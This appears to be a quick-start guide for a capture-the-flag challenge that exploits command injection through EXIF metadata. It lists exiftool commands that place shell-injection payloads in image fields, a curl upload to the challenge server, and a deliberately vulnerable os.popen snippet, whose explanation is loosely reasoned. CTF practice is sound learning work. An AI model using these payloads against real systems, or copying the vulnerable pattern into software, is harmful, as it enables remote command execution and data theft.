# Quick Start Guide

## Challenge Overview

**Target**: http://chall.0xfun.org:61927/  
**Goal**: Exploit command injection in EXIF metadata processing to read `flag.txt`

## Quick Exploit

### Method 1: Automated Script (Bash)

```bash
# Make the script executable
chmod +x exploit.sh

# Run the exploit
./exploit.sh
```

The script will:
1. Create a malicious JPEG image
2. Inject command payloads into EXIF metadata
3. Upload to the target server
4. Display any flags found in the response

### Method 2: Python Exploit

```bash
# Install dependencies
pip install -r requirements.txt

# Run the exploit
python3 exploit_exif_injection.py
```

### Method 3: Manual Exploitation

1. **Create a base image**:
   ```bash
   convert -size 100x100 xc:red exploit.jpg
   ```

2. **Inject malicious EXIF data**:
   ```bash
   exiftool -Artist="'; cat flag.txt; echo '" exploit.jpg
   ```

3. **Upload via browser or curl**:
   ```bash
   curl -F "file=@exploit.jpg" http://chall.0xfun.org:61927/upload
   ```

4. **Check response for flag output**

## Common Payloads

Try these EXIF injection payloads:

```bash
# Semicolon injection
exiftool -Artist="'; cat flag.txt; echo '" image.jpg

# Pipe injection  
exiftool -Copyright="test | cat flag.txt" image.jpg

# Command substitution
exiftool -Software="test$(cat flag.txt)" image.jpg

# AND chaining
exiftool -Make="test && cat flag.txt" image.jpg

# Backtick substitution
exiftool -Model="test\`cat flag.txt\`" image.jpg
```

## Troubleshooting

### "Connection refused" or "Host not found"
The challenge server may be down or not accessible from your location. Try:
- Using a VPN
- Checking if the URL is correct
- Verifying the server is online

### "exiftool not found"
Install exiftool:
```bash
# Ubuntu/Debian
sudo apt-get install libimage-exiftool-perl

# macOS
brew install exiftool
```

### No flag in response
Try:
1. Different EXIF fields (Artist, Copyright, Software, Make, Model)
2. Different injection patterns (semicolon, pipe, substitution)
3. Check if the response includes EXIF data in HTML/JSON
4. Look at the source code of the response page

## What to Look For

The flag is typically in one of these formats:
- `flag{...}`
- `CTF{...}`
- `0xfun{...}`

Check:
- HTTP response body
- Displayed EXIF information on the page
- JSON responses
- HTML comments
- JavaScript variables

## Understanding the Vulnerability

The server likely has code similar to:

```python
# VULNERABLE CODE
import os
filename = request.files['file'].filename
artist = os.popen(f"exiftool -Artist {filename}").read()
```

When we inject `'; cat flag.txt; echo '` in the Artist field, the command becomes:
```bash
exiftool -Artist '; cat flag.txt; echo '
```

This executes our injected command.

## Success Indicators

You've successfully exploited the vulnerability when you see:
- ✅ File contents from `flag.txt` in the response
- ✅ Command execution output
- ✅ The flag value

## Need Help?

Read the full documentation in `EXPLOIT_README.md` for detailed technical information about the vulnerability and exploitation techniques.
